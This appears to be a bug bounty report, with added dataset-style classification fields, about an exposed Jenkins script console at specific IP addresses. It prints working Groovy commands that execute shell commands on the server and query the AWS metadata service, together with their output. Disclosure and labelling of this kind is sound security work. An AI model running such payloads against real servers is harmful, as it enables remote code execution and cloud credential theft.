title: Public Jenkins instance with /script enabled
content:
Hi,
First of all. I'm not 100% able to verify that this server is actually owned by Ubnt as there are multiple DNS Name's in the SSL certificate.
Code 131 Bytes
1DNS Name: *.uum.com
2DNS Name: *.ubnt.com
3DNS Name: *.svc.ubnt.com
4DNS Name: *.api.uum.com
5DNS Name: *.svc.uum.com
6DNS Name: uum.com
So, the server hosted on https://54.191.232.223/and https://54.186.253.37/is reachable from the internet and has the scirpt console enabled.
You can execute code on it by going to: https://54.186.253.37/script and insert the following code:
Code 21 Bytes
1"ls /".execute().text
result
Code 562 Bytes
1Result: bin
2boot
3dev
4docker-java-home
5etc
6home
7lib
8lib64
9media
10mnt
11opt
12proc
13root
14run
15sbin
16srv
17sys
18tmp
19usr
20var
21```
22
23It also allows reaching the AWS metadata server:
24
25```
26"curl http://169.254.169.254/latest/meta-data/".execute().text
27```
28
29__Result__
30
31```
32ami-id
33ami-launch-index
34ami-manifest-path
35block-device-mapping/
36hostname
37iam/
38instance-action
39instance-id
40instance-type
41local-hostname
42local-ipv4
43mac
44metrics/
45network/
46placement/
47profile
48public-hostname
49public-ipv4
50public-keys/
51reservation-id
52security-groups
53services/
54```
55
56## Impact
57
58RCE
59
60{F340446}
61{F340447}
steps: Access the Jenkins instance at https://54.186.253.37/script
Enter the Groovy script 'ls /'.execute().text to list the root directory contents
vuln_description: The Jenkins instance has the script console enabled and accessible without authentication, allowing remote code execution (RCE) by executing arbitrary Groovy scripts. Additionally, the instance allows access to the AWS metadata server, which could lead to further exploitation.
reason: The vulnerability is straightforward to discover as it involves accessing a publicly exposed Jenkins script console and executing simple commands. No complex interactions or state manipulations are required.

authnz_metadata.reason: The report involves a public Jenkins instance with script console enabled, which is an authentication/authorization bypass vulnerability. The methodology described focuses on detecting IDOR and AuthN/AuthZ bypass vulnerabilities within the same application by testing different user sessions and resource IDs. However, the Jenkins vulnerability is a misconfiguration that allows unauthenticated users to execute arbitrary code, which is not covered by the described methodology as it doesn't involve user sessions or resource IDs within the same application context.
